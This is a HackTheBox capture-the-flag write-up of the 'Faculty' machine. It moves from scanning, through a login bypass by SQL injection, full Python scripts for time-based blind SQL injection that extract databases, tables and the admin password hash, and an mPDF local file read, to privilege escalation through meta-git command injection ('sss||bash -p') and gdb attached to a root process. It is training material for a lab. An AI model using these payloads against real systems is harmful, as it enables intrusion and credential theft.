---
title: HTB Write-up - Faculty
date: 2025-07-23 11:44:00 -0400
description: >-
   This is a HackTheBox Write-Up to guide you through different ways of getting access to this machine using python for SQL Injections.
author: j4ckris
categories: [HackTheBox]
tags: [pentesting]     # TAG names should always be lowercase
---

Today we will look at the faculty machine from HackTheBox.

# Recon/Scanning

```java
Nmap scan report for faculty.htb (10.10.11.169)
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Starting with some **recon/scanning**, we just have the port 80 to our dispossal to exploit so let's **enumerating**.

I start to use **dirsearch, and gobuster** this is what i find.

```java
200     0B   http://faculty.htb/admin/ajax.php
403   564B   http://faculty.htb/admin/assets/
301   178B   http://faculty.htb/admin/assets    -> REDIRECTS TO: http://faculty.htb/admin/assets/
301   178B   http://faculty.htb/admin/database    -> REDIRECTS TO: http://faculty.htb/admin/database/
403   564B   http://faculty.htb/admin/database/
200    17B   http://faculty.htb/admin/download.php
200     3KB  http://faculty.htb/admin/header.php
200     3KB  http://faculty.htb/admin/home.php
200     5KB  http://faculty.htb/admin/login.php
200     0B   http://faculty.htb/admin/readme.txt
200     2KB  http://faculty.htb/admin/users.php
```

So the **admin** directory calls my attention, when i put the url it leads me to a login panel.

## Explotation

### Firts method
![](/assets/img/faculty-htb/login_explotation.png)

Here i try a simple **sqli** to exploit the login panel to see if i can bypass the login, and get access to the dashboard or something like that. Successfully get access to the dashboard!!

![](/assets/img/faculty-htb/orderby.png)

### Second method

I decided to do it manually, with **Python and Burpsuite** so, start looking how many **columns** the **db** have, to know how many they are with **NULL** instructions, basically what it does is that you are saying to the **db** this is a **null space**, and the **null spaces** are equal to how many **columns** in the **db**.

![](/assets/img/faculty-htb/null_columns.png)

You can do the same using **order by "number of columns"**. Example:

![](/assets/img/faculty-htb/orderby.png)

I'll try a time based query to see if i can get information to do the script i want in **Python**.

![](/assets/img/faculty-htb/burp_sqli_sleep.png)

Voila!! we have a potential exploit advantage.

Now how do i exploit this using **Python**, well this is a **sqli blind**, we exploit this using **time based** payloads, and scripting them in **Python** as data **requests**, so these 2 script's you see right here will get the **db's** for further actions.

```python
#!/usr/bin/python3

from pwn import *
import requests, time, signal, pdb, string, sys


def def_handler(sig, frame):
    print("\n[!] Exiting....\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global Variables

characters = string.ascii_lowercase + string.digits + '-_'
login_url = 'http://faculty.htb/admin/ajax.php?action=login'


def sqli():

    database = ""

    p1 = log.progress("Brute Force")
    p1.status("Starting Attack")


    p2 = log.progress("Database")

    for position in range(1, 20):

        for character in characters:


            post_data = {
                'username' : "admin' and if(substr(database(),%d,1)='%s',sleep(1.5),1)-- -" % (position,character),
                'password' : 'password'

            }

            p1.status(post_data['username'])

            time_start = time.time()

            r = requests.post(login_url, data=post_data)

            time_end = time.time()

            if time_end - time_start > 1.5:
                database += character
                p2.status(database)
                break


if __name__ == '__main__':
    sqli()

```

You can use this other function to get all existance **databases** with a coma, really good represented.


```python

def sqli():

    database = ""

    p1 = log.progress("Brute Force")
    p1.status("Starting Attack")


    p2 = log.progress("Database")
    for db in range(0, 7):

        for position in range(1, 20):

            for character in characters:


                post_data = {
                    'username' : "admin' and if(substr((select schema_name from information_schema.schemata limit %d,1),%d,1)='%s',sleep(1.5),1)-- -" % (db,position,character),
                    'password' : 'password'

                }

                p1.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1.5:
                    database += character
                    p2.status(database)
                    break
        database += ","
```
**Example:**
![](/assets/img/faculty-htb/script_results_db.png)

Once you have the **database** name you want, you need to update the function to get **tables**.

```python
def sqli():

    tables = ""

    p1 = log.progress("Brute Force")
    p1.status("Starting Attack")


    p2 = log.progress("Tables [DB:scheduling_db] ")
    for db in range(0, 7):

        for position in range(1, 20):

            for character in characters:


                post_data = {
                    'username' : "admin' and if(substr((select table_name from information_schema.tables where table_schema = 'scheduling_db' limit %d,1),%d,1)='%s',sleep(1.5),1)-- -" % (db,position,character),
                    'password' : 'password'

                }

                p1.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1.5:
                    tables += character
                    p2.status(tables)
                    break
        tables += ","

```
**Example:**
![](/assets/img/faculty-htb/tables_sqli.png)

Now we got the **tables** we need to get the **columns**, update the script one more time.

```python
def sqli():

    columns = ""

    p1 = log.progress("Brute Force")
    p1.status("Starting Attack")


    p2 = log.progress("Columns [DB:scheduling_db][Table:users]")
    for db in range(0, 7):

        for position in range(1, 20):

            for character in characters:


                post_data = {
                    'username' : "admin' and if(substr((select column_name from information_schema.columns where table_schema = 'scheduling_db' and table_name = 'users' limit %d,1),%d,1)='%s',sleep(1.5),1)-- -" % (db,position,character),
                    'password' : 'password'

                }

                p1.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1.5:
                    columns += character
                    p2.status(columns)
                    break
        columns += ","
```
**Example:**
![](/assets/img/faculty-htb/columns_sqli.png)

Now you have the password column, we need to **dump "password"** to get **admin** credentials. **Update** again like this.

```python
def sqli():
    password = ""

    p1 = log.progress("Brute Force")
    p1.status("Starting Attack")


    p2 = log.progress("Admin Password [DB:scheduling_db][Table:users][Coloumn:password]")

    for position in range(1, 35):

        for character in characters:


            post_data = {
                'username' : "admin' and if(substr((select password from users where username = 'admin'),%d,1)='%s',sleep(1.5),1)-- -" % (position,character),
                'password' : 'password'

            }

            p1.status(post_data['username'])

            time_start = time.time()

            r = requests.post(login_url, data=post_data)

            time_end = time.time()

            if time_end - time_start > 1.5:
                password += character
                p2.status(password)
                break

```
**Example:**
![](/assets/img/faculty-htb/admin_password.png)

So after we do all this stuff, if we try to crack that md5 password hash , you will see that **is not crackeable :(**, at least we tried, no?


After we bypass the login panel i found this feature in the **faculty list** option.

![](/assets/img/faculty-htb/mpdf1.png)

Immediately we see that what is **requesting** is something encoded in **base64**. This is what its requesting.

![](/assets/img/faculty-htb/mpdf_burp1.png)

Looking around i found an exploit in **exploitdb**.

![](/assets/img/faculty-htb/exploitdb_screen1.png)

 - [https://www.exploit-db.com/exploits/50995](https://www.exploit-db.com/exploits/50995)

Basically what it does is that encodes a route of the system, and **represented** in a **pdf file** Let's see it in action.

**First Step: Generate it**
![](/assets/img/faculty-htb/payload_to_exploit.png)

**Second Step: Paste it**

![](/assets/img/faculty-htb/burp_payloading.png)

**Third Step: Get the file**

![](/assets/img/faculty-htb/pdf_passwd.png)

Starting to exploit this, found literally all the **files and downloaded**. The **files** that we saw **before** in the **enumeration phase** of the web aplication.

![](/assets/img/faculty-htb/file_founded.png)

Now let's see how many users are here.

![](/assets/img/faculty-htb/passwd.png)

In the **db_connect** file, i found some credentials so i tried to used against one of the users that i find in the **/etc/passwd** file, **gbyolo**, and guess what. **Access Granted!!**

![](/assets/img/faculty-htb/access_granted.png)

# Priviladge Escalation

Later than some basic enumeration i see that we can use something called **meta-git** as the **developer** user.

![](/assets/img/faculty-htb/sudo_enum.png)


So i start searching, and found a **hackerone report** that show me how to exploit **meta-git** to **RCE**. **Exploit it like this**.

 - [https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)

```bash
sudo -u developer /usr/local/bin/meta-git clone 'sss||bash -p'

```
Now that we are the user **developer** we need root access. Found **gdb** in the **capabilities** enumeration, and saw that it was using the **debug** group, and i was in the same group.

![](/assets/img/faculty-htb/gdb_cap.png)

This can lead to a priviladge escalation, how can we exploit this, first we need to **find a process that is running as root**, and copy the **PID**, like this:

![](/assets/img/faculty-htb/ps.png)


Now we attach gdb to the **PID** of the process that we will exploit, in this case we are exploiting a process that is running as root, and is executing a python script **that has import the os library**, so keep that in mind for further's explotation's.

![](/assets/img/faculty-htb/gdb_explotation.png)

Now we make a **call** to the **system** to execute a command like you will see in the following, and you will see that you got an potential priviladge escalation.

![](/assets/img/faculty-htb/poc_gdb2.png)

Easy, right? I execute the following to get access as root.

![](/assets/img/faculty-htb/rooted.png)

You got root access!! So that's how you get into **Faculty** machine from **Hackthebox**.
